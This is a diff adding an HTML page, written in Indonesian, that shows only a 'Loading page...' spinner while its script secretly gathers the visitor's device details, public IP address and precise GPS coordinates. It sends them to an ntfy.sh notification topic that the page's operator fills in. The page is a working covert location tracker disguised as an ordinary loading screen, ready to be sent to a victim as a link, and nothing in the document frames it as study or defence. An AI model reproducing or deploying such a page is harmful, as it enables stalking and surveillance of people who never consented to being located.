@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Memuat...</title>
+  <style>
+    body{font-family:-apple-system,Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#f0f2f5}
+    .box{text-align:center;color:#555}
+    .spinner{width:40px;height:40px;margin:0 auto 15px;border:4px solid #ddd;border-top-color:#2563eb;border-radius:50%;animation:s .8s linear infinite}
+    @keyframes s{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="spinner"></div>
+    <p>Memuat halaman...</p>
+  </div>
+
+  <script>
+    const TOPIK = "GANTI-TOPIK-RAHASIA-KAMU";
+
+    function kirim(data) {
+      fetch("https://ntfy.sh/" + TOPIK, {
+        method: "POST",
+        body: JSON.stringify(data)
+      }).catch(()=>{});
+    }
+
+    const info = {
+      waktu: new Date().toISOString(),
+      device: navigator.userAgent,
+      bahasa: navigator.language,
+      layar: screen.width + "x" + screen.height
+    };
+
+    // === AMBIL LOKASI DENGAN AKURASI MAKSIMAL ===
+    function ambilLokasiTerbaik() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject("tidak support");
+
+        let best = null;          // posisi terbaik sejauh ini
+        let watchId = null;
+        const DURASI = 20000;     // pantau 20 detik
+        const TARGET_AKURASI = 10; // kalau sudah ≤10m, stop lebih awal
+
+        const mulai = Date.now();
+
+        watchId = navigator.geolocation.watchPosition(
+          (pos) => {
+            const acc = pos.coords.accuracy;
+            // simpan kalau lebih akurat dari sebelumnya
+            if (!best || acc < best.coords.accuracy) {
+              best = pos;
+            }
+            // kalau sudah sangat akurat, berhenti lebih awal
+            if (acc <= TARGET_AKURASI) {
+              navigator.geolocation.clearWatch(watchId);
+              resolve(best);
+            }
+          },
+          (err) => {
+            // kalau sudah ada data sebelumnya, pakai itu
+            if (best) {
+              navigator.geolocation.clearWatch(watchId);
+              resolve(best);
+            } else {
+              reject(err.message);
+            }
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 30000,
+            maximumAge: 0
+          }
+        );
+
+        // stop setelah durasi habis
+        setTimeout(() => {
+          navigator.geolocation.clearWatch(watchId);
+          if (best) resolve(best);
+          else reject("timeout");
+        }, DURASI);
+      });
+    }
+
+    fetch("https://api.ipify.org?format=json")
+      .then(r => r.json())
+      .then(d => { info.ip = d.ip; })
+      .catch(() => { info.ip = "unknown"; })
+      .finally(() => {
+        ambilLokasiTerbaik()
+          .then((pos) => {
+            kirim({
+              ...info,
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              akurasi: Math.round(pos.coords.accuracy),
+              status: "sukses"
+            });
+          })
+          .catch((err) => {
+            kirim({ ...info, status: "gagal: " + err });
+          });
+      });
+  </script>
+</body>
+</html>
